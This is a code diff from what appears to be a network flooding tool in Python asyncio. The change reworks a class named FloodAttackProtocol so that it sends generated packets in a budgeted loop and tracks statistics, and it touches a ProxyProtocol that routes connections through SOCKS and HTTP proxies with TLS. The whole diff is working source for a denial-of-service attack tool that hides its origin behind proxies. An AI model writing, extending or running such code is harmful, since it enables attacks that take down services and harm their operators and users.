@@ -7,21 +7,26 @@ from python_socks.async_.asyncio._proxy import HttpProxy, Socks4Proxy, Socks5Pro
 from python_socks.async_.asyncio import Proxy
 from python_socks._proto import socks4, socks5, http as http_proto
 
+# XXX: decide what to do with this library
 try:
     from http_parser.parser import HttpParser
 except ImportError:
     from http_parser.pyparser import HttpParser
 
-from .core import logger
+from .core import logger, PacketPayload
 
+
+# XXX: how to tigger cancel properly?
+# XXX: type annotations
 class FloodAttackProtocol(asyncio.Protocol):
-    
-    def __init__(self, loop, stats, payload: bytes, settings, on_done: asyncio.Future):
+    # XXX: payload could be a callback rather than bytes 
+    def __init__(self, loop, stats, payload: PacketPayload, settings, on_done: asyncio.Future):
         self._loop = loop
         self._stats = stats
         self._payload = payload
-        self._payload_size = len(payload)
+        self._payload_size = len(payload) if isinstance(payload, bytes) else None
         self._settings = settings
+        # XXX: rename to _on_close
         self._on_done = on_done
         self._transport = None
         self._handle = None
@@ -37,13 +42,21 @@ class FloodAttackProtocol(asyncio.Protocol):
             self._transport.pause_reading()
         self._handle = self._loop.call_soon(self._send_packet)
 
+    def _prepare_packet(self):
+        if self._payload_size is not None:
+            return self._payload, self._payload_size
+        else:
+            packet = self._payload()
+            return packet, len(packet)
+
     def _send_packet(self) -> None:
         if not self._transport: return
         if self._paused:
             self._handle = None
         else:
-            self._transport.write(self._payload)
-            self._stats.track(1, self._payload_size)
+            packet, size = self._prepare_packet()
+            self._transport.write(packet)
+            self._stats.track(1, size)
             self._budget -= 1
             self._return_code = True
             if self._budget > 0:
@@ -146,9 +159,10 @@ class ProxyProtocol(asyncio.Protocol):
         self._dest_connected = True
         self._downstream_protocol = self._downstream_factory()
         if self._ssl is None:
-            logger.debug(f"==> Dest is connected through {self._proxy_url}")
+            logger.debug(f"Dest is connected through {self._proxy_url}")
             self._downstream_protocol.connection_made(self._transport)
         else:
+            # XXX: deal with handshake timeout
             _tls = self._loop.create_task(
                 self._loop.start_tls(self._transport, self._downstream_protocol, self._ssl))
             _tls.add_done_callback(self._setup_downstream_tls)
